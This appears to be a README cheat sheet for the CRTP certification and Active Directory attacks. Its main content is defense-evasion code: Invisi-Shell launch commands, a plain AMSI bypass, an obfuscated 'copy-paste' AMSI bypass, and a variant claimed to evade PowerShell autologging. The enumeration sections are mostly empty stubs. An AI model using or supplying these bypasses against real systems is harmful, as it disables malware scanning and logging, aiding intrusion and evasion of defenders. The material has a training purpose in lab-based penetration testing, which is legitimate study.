# CRTP_Skid
Commands and reference material useful for the CRTP course and attacking Active Directory in general.

- [CRTP AD Attacks](#CRTP-Skid)
  - [Shell Prep & Defense Evasion](#Shell-Prep-&-Defense-Evasion)  
    - [Invisi-Shell](#Invisi-Shell)
    - [AMSI Bypass](#AMSI-Bypass)
  - [Domain Enumeration](#Domain-Enumeration)  
    - [Powerview](#Powerview)
      - [Domain](#Domain)
      - [Users & Groups](#Users-&-Groups)
    - [AD PowerShell Module](#AD-Module)

## Shell Prep & Defense Evasion

#### Invisi-Shell (https://github.com/OmerYa/Invisi-Shell)
Invisi-Shell is used in the labs to bypass PowerShell security features by hooking .NET assemblies. Invisi-Shell a batch file for execution (two batch files dependant on current privilege level) that reference the invisi-shell DLL. Note - Invisi-shell may break certain functionality of certain programs run within shell.
```
C:\Path\RunWithRegistryNonAdmin.bat 
C:\Path\RunWithPathAsAdmin.bat
```
#### AMSI Bypass 

#### ‘Plain’ AMSI bypass example:
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

#### Obfuscation example for copy-paste purposes:
```
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

```

#### Another bypass, which is not detected by PowerShell autologging:
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
## Domain Enumeration 
#### Powerview 
```
```
#### Active Directory PowerShell Module
[Microsofts AD PowerShell](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) module can also be used for domain enumeration. 
